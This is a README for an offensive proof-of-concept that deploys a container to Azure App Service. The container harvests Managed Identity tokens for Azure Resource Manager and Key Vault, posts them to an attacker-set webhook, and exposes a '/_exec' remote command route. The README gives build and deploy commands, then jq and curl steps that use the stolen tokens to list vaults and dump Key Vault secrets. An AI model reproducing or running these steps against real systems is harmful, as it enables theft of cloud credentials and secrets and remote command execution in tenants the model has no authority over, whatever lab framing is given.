# Azure App Service Identity Harvest PoC

This PoC deploys a custom container to an Azure App Service that:
- Exposes a simple health endpoint
- Optionally allows controlled remote command execution (`/_exec`)
- Harvests Managed Identity tokens (System-Assigned + optionally User-Assigned) from the App Service environment
- Exfiltrates tokens to a provided `WEBHOOK_URL`

---

## Features
- **IMDS/MSI endpoint discovery** — Uses `IDENTITY_ENDPOINT` / `MSI_ENDPOINT` from env if available, otherwise falls back to known IP:port patterns.
- **Multiple API versions** — Supports `api-version` variants for both new and legacy MSI endpoints.
- **Resource coverage** — Requests tokens for:
  - Azure Resource Manager (`https://management.azure.com/`)
  - Azure Key Vault (`https://vault.azure.net/`)
- **Command execution route** — `POST /_exec` with a shared secret for ad-hoc commands (lab use only).

## Build & Push
```bash
# Vars
ACR_LOGIN_SERVER="yourregistry.azurecr.io"
ACR_USER="registry-username"
ACR_PASS="registry-password"
REPO="appservice-harvest"
TAG="v1"
IMAGE="$ACR_LOGIN_SERVER/$REPO:$TAG"

# Login to ACR
echo "$ACR_PASS" | docker login "$ACR_LOGIN_SERVER" -u "$ACR_USER" --password-stdin

# Build + push for linux/amd64 (App Service expects this)
docker buildx build \
  --platform linux/amd64 \
  -t "$IMAGE" \
  --push \
  .
```

## Deploy to Web App
```bash
# Configure container
az webapp config container set \
  -g "$AZ_RESOURCE_GROUP" -n "$WEBAPP" \
  --container-image-name "$ACR_LOGIN_SERVER/$REPO:$TAG" \
  --container-registry-url "https://$ACR_LOGIN_SERVER" \
  --container-registry-user "$ACR_USER" \
  --container-registry-password "$ACR_PASS"

# Optional: restart via Kudu (avoids full re-deploy)
curl -u "$KUDU_USER:$KUDU_PASS" \
  -X POST "https://$WEBAPP.scm.azurewebsites.net/api/app/restart"
```

## Environment Variables
| Name        | Purpose                                              |
|-------------|------------------------------------------------------|
| WEBHOOK_URL | Where harvested tokens are POSTed                    |
| UAMI_CID    | Optional client ID for a User-Assigned MI            |
| ENABLE_CMD  | Set 1 to enable /_exec                                |
| CMD_TOKEN   | Shared secret for /_exec requests                    |
| CMD_ALLOW   | Comma-separated list of allowed commands (empty = allow all) |

## Routes
- `/` — Basic health OK
- `/_health` — JSON health check
- `/_exec` — POST JSON `{"cmd":"id"}` with `X-Cmd-Token` header
- (Harvest runs in background on container start)

---

## Harvest Logic
1. Checks environment for `IDENTITY_ENDPOINT` or `MSI_ENDPOINT`.
2. Iterates over known MSI URL formats (IMDS + legacy App Service).
3. Requests tokens for ARM and Key Vault.
4. Optionally requests UAMI tokens if `UAMI_CID` set.
5. Exfiltrates results to `WEBHOOK_URL`.

## Using the Tokens

### Extract from webhook payload
```bash
TOK_KV=$(jq -r '.data | fromjson | .tokens.system_kv // .tokens.uami_kv' exfil.json)
TOK_ARM=$(jq -r '.data | fromjson | .tokens.system_arm // .tokens.uami_arm' exfil.json)
```

### Enumerate Vaults (ARM token)
```bash
SUB="<subscription-id>"
curl -sS \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" \
  -H "Authorization: Bearer $TOK_ARM" | jq '.value[].name'
```

### Dump Secrets (KV token)
```bash
VAULT="my-vault-name"
API="7.4"
curl -sS "https://$VAULT.vault.azure.net/secrets?api-version=$API" \
  -H "Authorization: Bearer $TOK_KV" | jq .
```

## Troubleshooting
- **Container not starting** — Ensure `--platform linux/amd64` in docker buildx.
- **Image pull failures** — Disable MI image pull if needed:
```bash
az resource update \
  --ids "/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$WEBAPP/config/web" \
  --set properties.acrUseManagedIdentityCreds=false
```
- **No tokens** — Confirm MI is enabled for the App Service, try both `IDENTITY_ENDPOINT` and `MSI_ENDPOINT`.
